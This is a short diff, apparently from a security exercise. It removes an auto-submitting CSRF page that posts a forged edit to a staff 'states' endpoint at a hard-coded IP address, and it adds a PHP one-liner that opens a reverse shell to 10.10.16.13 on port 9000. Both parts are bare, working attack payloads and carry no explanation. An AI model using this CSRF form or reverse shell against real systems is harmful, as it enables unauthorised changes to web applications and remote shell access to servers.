@@ -1,13 +1,1 @@
-<!DOCTYPE HTML>
-<html>
-  <head>
-    <title> CSRF INVASION </title>
-  </head>
-  <body onload="document.evil_form.submit();">
-       <form action='https://35.184.88.145/red/public/staff/states/edit.php?id=1' method='POST' name='evil_form'>
-          <input type='hidden' name='name' value='I will be the #1 Hacker! (CSRF ATTACK)'/>
-          <input type='hidden' name='code' value='AL'/>
-          <input type='hidden' name='country_id' value='1'/>
-       </form>
-  </body>
-</html>
+php -r '$s=fsockopen("10.10.16.13",9000);exec("/bin/sh -i <&3 >&3 2>&3");'
